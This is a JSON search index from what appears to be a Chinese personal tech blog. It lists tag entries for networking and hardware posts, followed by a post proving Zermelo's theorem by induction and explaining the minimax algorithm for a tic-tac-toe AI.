\u5bf9\u73b0\u5b9e\u7684\u5f71\u54cd          </li> </ul>"},{"location":"tags/#tag:vrchat","title":"vrchat","text":"<ul> <li>            VR \u591a\u4eba\u89c2\u5f71          </li> </ul>"},{"location":"tags/#tag:vxlan","title":"vxlan","text":"<ul> <li>            \u4fbf\u643a\u8def\u7531\u5668          </li> </ul>"},{"location":"tags/#tag:windows","title":"windows","text":"<ul> <li>            windows \u76f8\u5173          </li> <li>            windows \u91cd\u88c5\u7cfb\u7edf\u6b65\u9aa4          </li> </ul>"},{"location":"tags/#tag:wireguard","title":"wireguard","text":"<ul> <li>            L3 \u8d1f\u8f7d\u5747\u8861\u5b9e\u73b0\u7f51\u901f\u53e0\u52a0          </li> <li>            Wireguard \u7ec4\u7f51          </li> </ul>"},{"location":"tags/#tag:wolf","title":"wolf","text":"<ul> <li>            \u670d\u52a1\u5668\u4e0a\u8fd0\u884cswitch\u6a21\u62df\u5668\uff08linux \u4e91\u6e38\u620f\uff09          </li> </ul>"},{"location":"tags/#tag:wsl","title":"wsl","text":"<ul> <li>            WSL \u8bb0\u5f55          </li> </ul>"},{"location":"tags/#tag:x11vnc","title":"x11vnc","text":"<ul> <li>            vnc \u548c rdp \u8fdc\u7a0b          </li> </ul>"},{"location":"tags/#tag:x570","title":"x570","text":"<ul> <li>            \u53f0\u5f0f\u673a\u5347\u7ea7-\u786c\u4ef6\u7bc7          </li> </ul>"},{"location":"tags/#tag:x86","title":"x86","text":"<ul> <li>            x86 \u8bb0\u5f55          </li> <li>            \u8bfb x86 \u624b\u518c\u8bb0\u5f55          </li> </ul>"},{"location":"tags/#tag:zsh","title":"zsh","text":"<ul> <li>            \u5b89\u88c5 linux \u540e\u7684\u914d\u7f6e          </li> </ul>"},{"location":"tags/#tag:\u4e8c\u624b","title":"\u4e8c\u624b","text":"<ul> <li>            \u4e8c\u624b\u673a\u68b0\u786c\u76d8\u8d2d\u4e70          </li> </ul>"},{"location":"tags/#tag:\u4e8c\u624b\u786c\u76d8","title":"\u4e8c\u624b\u786c\u76d8","text":"<ul> <li>            \u53f0\u5f0f\u673a\u5347\u7ea7-\u786c\u4ef6\u7bc7          </li> </ul>"},{"location":"tags/#tag:\u4e95\u5b57\u68cb","title":"\u4e95\u5b57\u68cb","text":"<ul> <li>            \u4e95\u5b57\u68cb\u4e0e\u6700\u5927\u6700\u5c0f\u503c\u7b97\u6cd5          </li> </ul>"},{"location":"tags/#tag:\u4f4d\u64cd\u4f5c","title":"\u4f4d\u64cd\u4f5c","text":"<ul> <li>            \u4f4d\u64cd\u4f5c tricky          </li> </ul>"},{"location":"tags/#tag:\u4f4d\u8fd0\u7b97","title":"\u4f4d\u8fd0\u7b97","text":"<ul> <li>            \u4f7f\u7528\u6574\u6570\u4f4d\u8fd0\u7b97\u8ba1\u7b97 div10          </li> </ul>"},{"location":"tags/#tag:\u4fdd\u7814","title":"\u4fdd\u7814","text":"<ul> <li>            \u8bb0\u5f55\u4e00\u6b21\u5931\u7720          </li> </ul>"},{"location":"tags/#tag:\u5177\u4f53\u6570\u5b66","title":"\u5177\u4f53\u6570\u5b66","text":"<ul> <li>            \u5177\u4f53\u6570\u5b66          </li> </ul>"},{"location":"tags/#tag:\u5185\u7f51\u7a7f\u900f","title":"\u5185\u7f51\u7a7f\u900f","text":"<ul> <li>            \u4e0d\u540c\u60c5\u51b5\u4e0b\u7684\u5185\u7f51\u7a7f\u900f          </li> </ul>"},{"location":"tags/#tag:\u5237\u673a","title":"\u5237\u673a","text":"<ul> <li>            \u5b89\u5353\u5237\u673a\u5e76\u5b89\u88c5 linux          </li> </ul>"},{"location":"tags/#tag:\u526a\u679d","title":"\u526a\u679d","text":"<ul> <li>            \u4e95\u5b57\u68cb\u4e0e\u6700\u5927\u6700\u5c0f\u503c\u7b97\u6cd5          </li> </ul>"},{"location":"tags/#tag:\u5927\u5c0f\u7aef","title":"\u5927\u5c0f\u7aef","text":"<ul> <li>            mips \u975e\u5bf9\u9f50\u6307\u4ee4\u4e0e\u5927\u5c0f\u7aef          </li> </ul>"},{"location":"tags/#tag:\u5965\u8fd0\u4f1a","title":"\u5965\u8fd0\u4f1a","text":"<ul> <li>            \u770b\u5965\u8fd0\u4f1a\u7684\u5404\u79cd\u59ff\u52bf          </li> </ul>"},{"location":"tags/#tag:\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531","title":"\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531","text":"<ul> <li>            Openwrt \u6298\u817e          </li> <li>            VLAN \u5b9e\u73b0\u5355\u7f51\u53e3\u8f6f\u8def\u7531          </li> <li>            Wireguard \u7ec4\u7f51          </li> <li>            openwrt DNS \u8be6\u89e3          </li> <li>            openwrt \u5237\u673a          </li> <li>            openwrt \u7f16\u8bd1          </li> <li>            openwrt \u8def\u7531\u5668\u9009\u62e9          </li> <li>            openwrt \u914d\u7f6e          </li> <li>            \u4e0d\u540c\u60c5\u51b5\u4e0b\u7684\u5185\u7f51\u7a7f\u900f          </li> <li>            \u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531          </li> <li>            \u5c0f\u7c73\u7535\u89c6\u8bbf\u95ee\u7535\u8111\u89c6\u9891          </li> <li>            \u79fb\u52a8\u5149\u732b\u5f00\u542f ipv6          </li> <li>            \u7f51\u7edc\u6302\u8f7d\u78c1\u76d8 (iSCSi)          </li> </ul>"},{"location":"tags/#tag:\u5b57\u4f53","title":"\u5b57\u4f53","text":"<ul> <li>            \u5b57\u4f53\u5206\u7c7b          </li> </ul>"},{"location":"tags/#tag:\u5d4c\u5165\u5f0f","title":"\u5d4c\u5165\u5f0f","text":"<ul> <li>            \u5d4c\u5165\u5f0f\u6280\u672f\u4e0e\u5b9e\u8df5          </li> </ul>"},{"location":"tags/#tag:\u5e74\u5ea6\u603b\u7ed3","title":"\u5e74\u5ea6\u603b\u7ed3","text":"<ul> <li>            \u5173\u4e8e 2020 \u5230\u76ee\u524d\u7684\u4e00\u4e2a\u603b\u7ed3          </li> </ul>"},{"location":"tags/#tag:\u5e8f\u7ae0","title":"\u5e8f\u7ae0","text":"<ul> <li>            \u5e8f\u7ae0          </li> </ul>"},{"location":"tags/#tag:\u5ef6\u65f6\u6444\u5f71","title":"\u5ef6\u65f6\u6444\u5f71","text":"<ul> <li>            \u4f7f\u7528 openwrt \u8def\u7531\u5668\u548c usb \u6444\u50cf\u5934\u8fdb\u884c\u5ef6\u65f6\u6444\u5f71          </li> </ul>"},{"location":"tags/#tag:\u6269\u5c55\u5c4f\u5e55","title":"\u6269\u5c55\u5c4f\u5e55","text":"<ul> <li>            \u4f7f\u7528\u5176\u5b83\u8bbe\u5907\u4f5c\u4e3a\u6269\u5c55\u5c4f\u5e55          </li> </ul>"},{"location":"tags/#tag:\u64cd\u4f5c\u7cfb\u7edf","title":"\u64cd\u4f5c\u7cfb\u7edf","text":"<ul> <li>            \u64cd\u4f5c\u7cfb\u7edf \u7b2c\u4e94\u7ae0\u4f5c\u4e1a CPU \u8c03\u5ea6          </li> <li>            \u64cd\u4f5c\u7cfb\u7edf\u6982\u5ff5 chapter1 \u4f5c\u4e1a          </li> <li>            \u64cd\u4f5c\u7cfb\u7edf\u6982\u5ff5 chapter2 \u4f5c\u4e1a          </li> <li>            \u64cd\u4f5c\u7cfb\u7edf\u6982\u5ff5 chapter3 \u4f5c\u4e1a          </li> <li>            \u64cd\u4f5c\u7cfb\u7edf\u6982\u5ff5 chapter4 \u4f5c\u4e1a          </li> <li>            \u64cd\u4f5c\u7cfb\u7edf\u7b2c\u4e03\u7ae0\u4f5c\u4e1a \u6b7b\u9501          </li> <li>            \u64cd\u4f5c\u7cfb\u7edf\u7b2c\u516d\u7ae0\u4f5c\u4e1a \u8fdb\u7a0b\u540c\u6b65          </li> </ul>"},{"location":"tags/#tag:\u6697\u5f71\u9a91\u58eb-2","title":"\u6697\u5f71\u9a91\u58eb 2","text":"<ul> <li>            \u66f4\u65b0\u56fa\u6001\u4e4b\u65c5          </li> </ul>"},{"location":"tags/#tag:\u6e38\u620f\u623f","title":"\u6e38\u620f\u623f","text":"<ul> <li>            \u865a\u62df\u6e38\u620f\u623f          </li> </ul>"},{"location":"tags/#tag:\u7535\u89c6","title":"\u7535\u89c6","text":"<ul> <li>            \u5c0f\u7c73\u7535\u89c6\u8bbf\u95ee\u7535\u8111\u89c6\u9891          </li> </ul>"},{"location":"tags/#tag:\u786c\u76d8","title":"\u786c\u76d8","text":"<ul> <li>            \u4e8c\u624b\u673a\u68b0\u786c\u76d8\u8d2d\u4e70          </li> </ul>"},{"location":"tags/#tag:\u7cfb\u7edf\u8fc1\u79fb","title":"\u7cfb\u7edf\u8fc1\u79fb","text":"<ul> <li>            linux \u7cfb\u7edf\u8fc1\u79fb          </li> </ul>"},{"location":"tags/#tag:\u7ec4\u6210\u539f\u7406","title":"\u7ec4\u6210\u539f\u7406","text":"<ul> <li>            \u8ba1\u7b97\u673a\u7ec4\u6210\u539f\u7406 \u7b2c\u4e00\u7ae0\u4f5c\u4e1a          </li> </ul>"},{"location":"tags/#tag:\u7f16\u8bd1\u539f\u7406","title":"\u7f16\u8bd1\u539f\u7406","text":"<ul> <li>            \u7f16\u8bd1\u539f\u7406\u603b\u7ed3          </li> </ul>"},{"location":"tags/#tag:\u7f51\u6865","title":"\u7f51\u6865","text":"<ul> <li>            Virtual Box \u914d\u7f6e\u53cc\u7f51\u5361          </li> </ul>"},{"location":"tags/#tag:\u7f51\u7edc","title":"\u7f51\u7edc","text":"<ul> <li>            NAS \u65e0\u6cd5\u626b\u63cf\u5230\u6d89\u53ca\u7684\u7f51\u7edc\u77e5\u8bc6          </li> </ul>"},{"location":"tags/#tag:\u7f51\u7edc\u6302\u8f7d","title":"\u7f51\u7edc\u6302\u8f7d","text":"<ul> <li>            \u7f51\u7edc\u6302\u8f7d\u78c1\u76d8 (iSCSi)          </li> </ul>"},{"location":"tags/#tag:\u7f57\u5c0f\u9ed1","title":"\u7f57\u5c0f\u9ed1","text":"<ul> <li>            \u7f57\u5c0f\u9ed1\u6218\u8bb0\uff0c\u7968\u623f\u51b2\u9e2d\uff01          </li> </ul>"},{"location":"tags/#tag:\u865a\u62df\u5316","title":"\u865a\u62df\u5316","text":"<ul> <li>            PVE          </li> </ul>"},{"location":"tags/#tag:\u865a\u62df\u6e38\u620f\u623f","title":"\u865a\u62df\u6e38\u620f\u623f","text":"<ul> <li>            \u590d\u53e4\u6a21\u62df\u5668\u524d\u7aef          </li> <li>            \u670d\u52a1\u5668\u4e0a\u8fd0\u884cswitch\u6a21\u62df\u5668\uff08linux \u4e91\u6e38\u620f\uff09          </li> <li>            \u865a\u62df\u6e38\u620f\u623f          </li> </ul>"},{"location":"tags/#tag:\u88c5\u673a","title":"\u88c5\u673a","text":"<ul> <li>            \u53f0\u5f0f\u673a\u5347\u7ea7-\u786c\u4ef6\u7bc7          </li> </ul>"},{"location":"tags/#tag:\u8bbe\u5907","title":"\u8bbe\u5907","text":"<ul> <li>            \u6361\u5783\u573e-rk3399 DIY KVM          </li> </ul>"},{"location":"tags/#tag:\u8d1f\u8f7d\u5747\u8861","title":"\u8d1f\u8f7d\u5747\u8861","text":"<ul> <li>            L3 \u8d1f\u8f7d\u5747\u8861\u5b9e\u73b0\u7f51\u901f\u53e0\u52a0          </li> </ul>"},{"location":"tags/#tag:\u8f6f\u8def\u7531","title":"\u8f6f\u8def\u7531","text":"<ul> <li>            VLAN \u5b9e\u73b0\u5355\u7f51\u53e3\u8f6f\u8def\u7531          </li> </ul>"},{"location":"tags/#tag:\u91cd\u88c5\u7cfb\u7edf","title":"\u91cd\u88c5\u7cfb\u7edf","text":"<ul> <li>            windows \u91cd\u88c5\u7cfb\u7edf\u6b65\u9aa4          </li> </ul>"},{"location":"tags/#tag:\u955c\u50cf","title":"\u955c\u50cf","text":"<ul> <li>            openwrt x86 \u5347\u7ea7          </li> </ul>"},{"location":"tools/","title":"\u5de5\u5177","text":""},{"location":"%E5%8D%9A%E5%AE%A2/2020/02/11/2020-02-11-%E4%BA%95%E5%AD%97%E6%A3%8B%E4%B8%8E%E6%9C%80%E5%A4%A7%E6%9C%80%E5%B0%8F%E5%80%BC%E7%AE%97%E6%B3%95/","title":"\u4e95\u5b57\u68cb\u4e0e\u6700\u5927\u6700\u5c0f\u503c\u7b97\u6cd5","text":"<p>\u7ecf\u8fc7\u6628\u665a\uff0c\u548c\u4eca\u5929\u65e9\u4e0a 8 \u70b9\u9192\u6765\u8db4\u5728\u5e8a\u4e0a\u52aa\u529b\u7684\u601d\u8003\u3002\u6211\u7ec8\u4e8e\u60f3\u8d77\u4e86\u5982\u4f55\u4f7f\u7528\u6570\u5b66\u5f52\u7eb3\u6cd5\u8bc1\u660e\u7b56\u6885\u6d1b\u5b9a\u7406\u3002\u7136\u540e\u7ecf\u8fc7\u4e00\u4e0a\u5348\u7684\u52aa\u529b\uff0c\u6211\u6210\u529f\u4f7f\u7528\u6700\u5927\u6700\u5c0f\u503c\u7b97\u6cd5\u5b9e\u73b0\u4e86\u4e95\u5b57\u68cb (Tic-Tak-Toe) \u7684 AI\uff0c\u7136\u540e\u6dfb\u52a0\u5230 wwh \u7684\u4e95\u5b57\u68cb\u4ee3\u7801\u4e2d\u3002</p>","tags":["\u4e95\u5b57\u68cb","\u526a\u679d"]},{"location":"%E5%8D%9A%E5%AE%A2/2020/02/11/2020-02-11-%E4%BA%95%E5%AD%97%E6%A3%8B%E4%B8%8E%E6%9C%80%E5%A4%A7%E6%9C%80%E5%B0%8F%E5%80%BC%E7%AE%97%E6%B3%95/#\u6570\u5b66\u5f52\u7eb3\u6cd5\u8bc1\u660e\u7b56\u6885\u6d1b\u5b9a\u7406","title":"\u6570\u5b66\u5f52\u7eb3\u6cd5\u8bc1\u660e\u7b56\u6885\u6d1b\u5b9a\u7406","text":"<p>\u7b56\u6885\u6d1b\u5b9a\u7406\uff1a</p> <p>\u6761\u4ef6\uff1a</p> <ol> <li>\u6e38\u620f\u53cc\u65b9\u62e5\u6709\u5b8c\u5168\u4fe1\u606f\uff08\u5373\u4e00\u65b9\u660e\u786e\u53e6\u4e00\u65b9\u7684\u6bcf\u4e00\u4e2a\u884c\u52a8\u6240\u4ea7\u751f\u7684\u6240\u6709\u540e\u679c\uff09</li> <li>\u6e38\u620f\u7684\u89c4\u5219\u4e0d\u5305\u542b\u968f\u673a\u6027</li> <li>\u6e38\u620f\u5fc5\u5b9a\u5728\u6709\u9650\u6b65\u5185\u7ed3\u675f</li> </ol> <p>\u7ed3\u8bba\uff1a</p> <ul> <li>\u5148\u624b\u6216\u540e\u624b\u5b58\u5728\u5fc5\u4e0d\u8d25\u7b56\u7565\uff08\u5982\u679c\u6e38\u620f\u53ea\u5305\u542b\u80dc\uff0c\u8d1f\u4e24\u79cd\u60c5\u51b5\uff0c\u5219\u7ed3\u8bba\u4e3a\uff1a\u5148\u624b\u6216\u540e\u624b\u5b58\u5728\u5fc5\u80dc\u7b56\u7565\uff09</li> </ul> <p>proof:</p> <p>\u5bf9\u6ee1\u8db3\u4e0a\u8ff0\u8981\u6c42\u7684\u4e00\u4e2a\u6e38\u620f\uff0c\u5047\u8bbe\u6e38\u620f\u7684\u6709\u9650\u6b65\u6570\u6700\u5927\u4e3a N\uff0c\u4ee5\u4e0b\u7528\u6570\u5b66\u5f52\u7eb3\u6cd5\u8bc1\u660e\u5bf9\u4efb\u610f\u975e\u96f6\u81ea\u7136\u6570 N\uff0c\u7ed3\u8bba\u6210\u7acb\u3002</p> <ol> <li> <p>\u5f53 N=1 \u65f6\uff0c\u7531\u4e8e\u5148\u624b\u884c\u52a8\u4e00\u6b65\u6e38\u620f\u4fbf\u7ed3\u675f\uff0c\u56e0\u6b64\u5b58\u5728\u51e0\u79cd\u53ef\u80fd\uff1a</p> <p>- \u5b58\u5728\u5148\u624b\u8d62\u6216\u5e73\u7684\u7ed3\u5c40\uff0c\u56e0\u6b64\u65e0\u8bba\u662f\u5426\u5b58\u5728\u540e\u624b\u8d62\u7684\u7ed3\u5c40\uff0c\u5148\u624b\u5fc5\u7136\u9009\u62e9\u4e0d\u8d25\u7684\u7ed3\u5c40\u3002\u5373\u5148\u624b\u5b58\u5728\u5fc5\u4e0d\u8d25\u7b56\u7565\u3002   - \u4e0d\u5b58\u5728\u5148\u624b\u8d62\u6216\u5e73\u7684\u7ed3\u5c40\uff0c\u5373\u6240\u6709\u7ed3\u5c40\u5747\u4e3a\u540e\u624b\u8d62\u3002\u540e\u624b\u5b58\u5728\u5fc5\u80dc\u7b56\u7565\u3002</p> <p>\u5747\u7b26\u5408\u5047\u8bbe\u3002</p> </li> <li> <p>\u5047\u8bbe\u5f53 N=k \u65f6\u4e5f\u6210\u7acb\uff0c\u5219\u5f53 N=k+1 \u65f6\u3002\u5bf9\u4e8e\u5148\u624b\u7684\u6bcf\u4e00\u79cd\u884c\u52a8\uff0c\u5728\u8be5\u6761\u4ef6\u4e0b\u53ef\u5f62\u6210\u4e00\u4e2a\u201c\u5b50\u6e38\u620f\u201d\uff0c\u4e14\u8be5\u6e38\u620f\u884c\u52a8\u6b65\u6570\u4e0a\u9650\u4e3a k\u3002\u56e0\u6b64\u6309\u7167\u7ed3\u8bba\uff0c\u53ef\u80fd\u7684\u60c5\u51b5\u4e3a\uff1a</p> <p>- \u6240\u6709\u201c\u5b50\u6e38\u620f\u201d\u4e2d\u5b58\u5728\u4e00\u4e2a\u4f7f\u5f97\u5148\u624b\u5b58\u5728\u5fc5\u4e0d\u8d25\u7b56\u7565\u3002\u5219\u5148\u624b\u5fc5\u7136\u4f1a\u9009\u62e9\u5bf9\u5e94\u884c\u52a8\u4ea7\u751f\u8be5\u5b50\u6e38\u620f\u3002\u5373\u5148\u624b\u5b58\u5728\u5fc5\u4e0d\u8d25\u7b56\u7565\u3002   - \u6240\u6709\u201c\u5b50\u6e38\u620f\u201d\u5747\u4e0d\u5b58\u5728\u5148\u624b\u5fc5\u4e0d\u8d25\u7b56\u7565\uff0c\u6309\u7167\u7ed3\u8bba\uff0c\u5219\u5fc5\u7136\u5747\u5b58\u5728\u540e\u624b\u5fc5\u4e0d\u8d25\u7b56\u7565\u3002\u5219\u539f\u6e38\u620f\u540e\u624b\u5b58\u5728\u5fc5\u4e0d\u8d25\u7b56\u7565\u3002</p> <p>\u56e0\u6b64 N=k+1 \u65f6\u7ed3\u8bba\u4e5f\u6210\u7acb\uff08\u8fd9\u91cc\u8bf4\u660e\u7684\u540e\u624b\u5b58\u5728\u5fc5\u80dc\u7b56\u7565\uff0c\u5219\u5fc5\u7136\u5b58\u5728\u5fc5\u4e0d\u8d25\u7b56\u7565\uff09</p> </li> </ol> <p>Q.E.D</p> <p>\u6b64\u5b9a\u7406\u7684\u7ed3\u8bba\u5341\u5206\u6709\u529b\uff0c\u5b83\u8868\u660e\u4e00\u4e2a\u6e38\u620f\u4ece\u89c4\u5219\u5236\u5b9a\u5b8c\u6210\u540e\uff0c\u7ed3\u5c40\u5c31\u5df2\u7ecf\u786e\u5b9a\u4e86\u3002\u56e0\u4e3a\u5982\u679c\u6e38\u620f\u662f\u4e00\u65b9\u5fc5\u8d62\u7684\uff0c\u90a3\u4e48\u7406\u8bba\u4e0a\u65e0\u8bba\u53e6\u4e00\u65b9\u600e\u4e48\u52aa\u529b\u90fd\u6c38\u8fdc\u90fd\u53ea\u80fd\u8d25\u5317\u3002\u800c\u5982\u679c\u6e38\u620f\u662f\u4e00\u65b9\u81f3\u5c11\u80fd\u4fdd\u8bc1\u5e73\u5c40\u7684\uff0c\u90a3\u4e48\u540c\u6837\u65e0\u8bba\u53e6\u4e00\u65b9\u600e\u4e48\u52aa\u529b\u4e5f\u53ea\u80fd\u548c\u5bf9\u65b9\u6253\u6210\u5e73\u624b\u3002</p> <p>\u7136\u800c\u8be5\u5b9a\u7406\u867d\u7136\u8bf4\u660e\u4e86\u5b58\u5728\u8fd9\u79cd\u7b56\u7565\uff0c\u4f46\u5e76\u6ca1\u6709\u7ed9\u51fa\u7b56\u7565\u662f\u4ec0\u4e48\uff1f\u662f\u600e\u4e48\u4e00\u79cd\u201c\u5f62\u5f0f\u201d\uff1f\u7a76\u7adf\u600e\u4e48\u624d\u80fd\u6309\u7167\u7b56\u7565\u6765\u8d70\u5462\uff1f</p> <p>HOWERVER\uff0c\u8fd9\u6837\u7684\u7b56\u7565\u4e8b\u5b9e\u4e0a\u4e00\u70b9\u4e5f\u4e0d\u62bd\u8c61\uff0c\u800c\u4e14\u6309\u7167\u7b56\u7565\u8d70\u7684\u65b9\u6cd5\u4e5f\u975e\u5e38\u7b80\u5355\uff01\uff01\uff01\u7b54\u6848\u5c31\u662f\u6700\u5927\u6700\u5c0f\u503c\u7b97\u6cd5\uff01\uff01\uff01</p>","tags":["\u4e95\u5b57\u68cb","\u526a\u679d"]},{"location":"%E5%8D%9A%E5%AE%A2/2020/02/11/2020-02-11-%E4%BA%95%E5%AD%97%E6%A3%8B%E4%B8%8E%E6%9C%80%E5%A4%A7%E6%9C%80%E5%B0%8F%E5%80%BC%E7%AE%97%E6%B3%95/#\u6700\u5927\u6700\u5c0f\u503c\u7b97\u6cd5","title":"\u6700\u5927\u6700\u5c0f\u503c\u7b97\u6cd5","text":"","tags":["\u4e95\u5b57\u68cb","\u526a\u679d"]},{"location":"%E5%8D%9A%E5%AE%A2/2020/02/11/2020-02-11-%E4%BA%95%E5%AD%97%E6%A3%8B%E4%B8%8E%E6%9C%80%E5%A4%A7%E6%9C%80%E5%B0%8F%E5%80%BC%E7%AE%97%E6%B3%95/#\u6b65\u9aa4","title":"\u6b65\u9aa4","text":"<ol> <li> <p>\u9996\u5148\uff0c\u6e38\u620f\u53cc\u65b9\u7684\u6240\u6709\u53ef\u80fd\u884c\u52a8\u53ef\u4ee5\u62bd\u8c61\u6210\u4e00\u4e2a\u4e00\u9897\u51b3\u7b56\u6811\u3002\u53cc\u65b9\u7684\u4e0d\u540c\u884c\u52a8\u4ea7\u751f\u4e0d\u540c\u7684\u5206\u652f\u3002\u76f4\u81f3\u67d0\u4e00\u65b9\u7684\u884c\u52a8\u5bfc\u81f4\u6e38\u620f\u7ed3\u675f\uff0c\u5e76\u5f62\u6210\u4e00\u4e2a\u53f6\u8282\u70b9\u3002</p> </li> <li> <p>\u6211\u4eec\u4ee5\u5148\u624b\u4e3a\u89c6\u89d2\uff0c\u628a\u51b3\u7b56\u6811\u7684\u6bcf\u4e2a\u53f6\u5b50\u8282\u70b9\u6807\u4e0a\u4e00\u4e2a\u503c\uff0c\u80dc\u8bb0\u4e3a 1\uff0c\u8d1f\u4e3a -1\uff0c\u5e73\u4e3a 0\u3002</p> </li> <li> <p>\u6211\u4eec\u77e5\u9053\u7b2c 0 \u5c42\uff08\u6839\u8282\u70b9\uff09\u4e3a\u5148\u624b\u7684\u51b3\u7b56\u5c42\u3002\u7531\u4e8e\u53cc\u65b9\u8f6e\u6d41\u51b3\u7b56\uff0c\u6613\u77e5\uff0c\u5076\u6570\u5c42\u4e3a\u5148\u624b\u51b3\u7b56\u5c42\uff0c\u6211\u4eec\u628a\u5b83\u79f0\u4e3a MAX \u5c42\u3002\u540c\u7406\uff0c\u5947\u6570\u5c42\u79f0\u4e3a MIN \u5c42\u3002</p> </li> <li> <p>\u63a5\u7740\u6211\u4eec\u5f00\u59cb\u81ea\u5e95\u5411\u4e0a\u904d\u5386\u51b3\u7b56\u6811\u3002\u5bf9\u4e8e\u6bcf\u4e2a MIN \u5c42\u7684\u7ed3\u70b9\uff0c\u6211\u4eec\u5c06\u5176\u5b50\u8282\u70b9\u4e2d\u7684\u6700\u5c0f\u503c\u8d4b\u503c\u7ed9\u8be5\u8282\u70b9\u3002\u5bf9\u4e8e\u6bcf\u4e2a MAX \u5c42\u7684\u7ed3\u70b9\uff0c\u6211\u4eec\u5c06\u5176\u5b50\u8282\u70b9\u4e2d\u7684\u6700\u5927\u503c\u8d4b\u503c\u7ed9\u8be5\u8282\u70b9\u3002\u6700\u7ec8\uff0c\u6211\u4eec\u80fd\u5f97\u6839\u8282\u70b9\u7684\u503c\u3002</p> </li> </ol>","tags":["\u4e95\u5b57\u68cb","\u526a\u679d"]},{"location":"%E5%8D%9A%E5%AE%A2/2020/02/11/2020-02-11-%E4%BA%95%E5%AD%97%E6%A3%8B%E4%B8%8E%E6%9C%80%E5%A4%A7%E6%9C%80%E5%B0%8F%E5%80%BC%E7%AE%97%E6%B3%95/#\u6839\u8282\u70b9\u503c\u7684\u542b\u4e49","title":"\u6839\u8282\u70b9\u503c\u7684\u542b\u4e49","text":"<ol> <li>\u4e3a 1\uff0c\u8fd9\u8868\u660e\u5148\u624b\u5b58\u5728\u5fc5\u80dc\u7b56\u7565\u3002</li> <li>\u4e3a 0\uff0c\u8fd9\u8868\u660e\u5148\u624b\u5b58\u5728\u5fc5\u5e73\u7b56\u7565\uff0c\u540e\u624b\u600e\u4e48\u4e5f\u4e0d\u53ef\u80fd\u8d62\u5148\u624b\u3002</li> <li>\u4e3a -1\uff0c\u8fd9\u8868\u660e\u53ea\u8981\u540e\u624b\u8db3\u591f\u201c\u806a\u660e\u201d\uff0c\u6bcf\u6b21\u90fd\u80fd\u4e0b\u6700\u201c\u6b63\u786e\u201c\u7684\u68cb\uff08MIN \u5c42\u4f7f\u8282\u70b9\u503c\u6700\u5c0f\uff09\uff0c\u90a3\u4e48\u5148\u624b\u5fc5\u8d25\u3002</li> </ol>","tags":["\u4e95\u5b57\u68cb","\u526a\u679d"]},{"location":"%E5%8D%9A%E5%AE%A2/2020/02/11/2020-02-11-%E4%BA%95%E5%AD%97%E6%A3%8B%E4%B8%8E%E6%9C%80%E5%A4%A7%E6%9C%80%E5%B0%8F%E5%80%BC%E7%AE%97%E6%B3%95/#\u539f\u7406","title":"\u539f\u7406","text":"<p>\u975e\u4e25\u683c\u5730\u5206\u6790\uff0c\u6211\u4eec\u8003\u8651\u4e0b\u56fe\u7684\u60c5\u5f62\uff0c\u65b9\u5f62\u4ee3\u8868 MAX \u5c42\uff0c\u5706\u5f62\u4ee3\u8868 MIN \u5c42\u3002</p> <p>\u6700\u540e\u80fd\u591f\u8bc1\u660e\u5bf9\u4efb\u610f\u5c42\uff0c\u8be5\u5c42\u8282\u70b9\u7684\u503c\u8868\u793a\uff0c\u5148\u624b\u5b58\u5728\u7b56\u7565\u4f7f\u5f97\u5728\u8be5\u201c\u5f62\u52bf\u201d\u4e0b\uff0c\u5148\u624b\u6700\u7ec8\u201c\u6536\u76ca\u201d\uff08\u628a +1\u3001-1\u30010 \u770b\u505a\u5bf9\u5148\u624b\u201c\u5f62\u52bf\u201d\u7684\u8bc4\u5206\uff09\u4e0d\u4f4e\u4e8e\u8be5\u503c\u3002\u4e25\u683c\u8bc1\u660e\u53ef\u4ee5\u5bf9\u5c42\u6570\u4f7f\u7528\u6570\u5b66\u5f52\u7eb3\u6cd5\u3002</p> <p></p>","tags":["\u4e95\u5b57\u68cb","\u526a\u679d"]},{"location":"%E5%8D%9A%E5%AE%A2/2020/02/11/2020-02-11-%E4%BA%95%E5%AD%97%E6%A3%8B%E4%B8%8E%E6%9C%80%E5%A4%A7%E6%9C%80%E5%B0%8F%E5%80%BC%E7%AE%97%E6%B3%95/#\u610f\u4e49","title":"\u610f\u4e49","text":"<p>\u53ef\u4ee5\u770b\u51fa\uff0c\u53ea\u8981\u6211\u4eec\u6784\u9020\u51fa\u4e86\u8fd9\u9897\u5b8c\u6574\u7684\u6811\uff0c\u628a\u5b83\u4fdd\u5b58\u6210\u4e00\u4e2a\u6587\u4ef6\u3002\u90a3\u4e48\u8fdb\u884c\u6e38\u620f\u65f6\uff0c\u6211\u4eec\u4fbf\u53ea\u662f\u4ece\u4e0a\u5f80\u4e0b\u9009\u62e9\u4e00\u6761\u8fb9\u8fd9\u4e48\u7b80\u5355\u3002\uff08\u5728\u81ea\u5e95\u5411\u4e0a\u904d\u5386\u6811\u7684\u540c\u65f6\uff0c\u9664\u4e86\u628a\u503c\u8d4b\u7ed9\u6bcf\u5c42\u8282\u70b9\uff0c\u8fd8\u53ef\u4ee5\u628a\u9009\u62e9\u7684\u4e0b\u4e00\u4e2a\u8282\u70b9\u4e5f\u5b58\u50a8\u4e0b\u6765\uff0c\u90a3\u4e48\u6b64\u65f6\u9009\u62e9\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u5c31\u662f O(1)\uff09</p> <p>\u56e0\u6b64\uff0c\u6211\u4eec\u4ece\u7406\u8bba\u4e0a\u662f\u8bc1\u660e\u4e86\u7b56\u6885\u6d1b\u5b9a\u7406\u532a\u5937\u6240\u601d\u7684\u7ed3\u8bba\uff0c\u5e76\u4e14\u8fd8\u7ed9\u51fa\u4e86\u53ef\u4ee5\u8bf4\u662f\u4e00\u79cd\u201c\u53ef\u6267\u884c\u201d\u7684\u65b9\u6cd5\u3002\u7136\u800c\uff0c\u6570\u5b66\u4e0a\u7684\u53ef\u884c\u5728\u5b9e\u9645\u4e0a\u5374\u672a\u5fc5\u53ef\u884c\u3002\u4ee5\u4e94\u5b50\u68cb\u4e3a\u4f8b\uff0c\u68cb\u76d8\u4e3a\\(15 \\times 15 =225\\)\u683c\uff0c\u5982\u679c\u91c7\u7528\u4e0a\u8ff0\u7b97\u6cd5\uff0c\u8fd9\u4e2a\u6811\u6700\u591a\u4f1a\u6709\uff1a</p> \\[     225! \\approx 10^{430} (n! \\approx \\sqrt{2\\pi n}\\left (\\frac{n}{e} \\right )^n) \\] <p>\u8fd9\u4e2a\u6570\u91cf\u7ea7\u7684\u8fb9\u6216\u8005\u8282\u70b9\u3002</p> 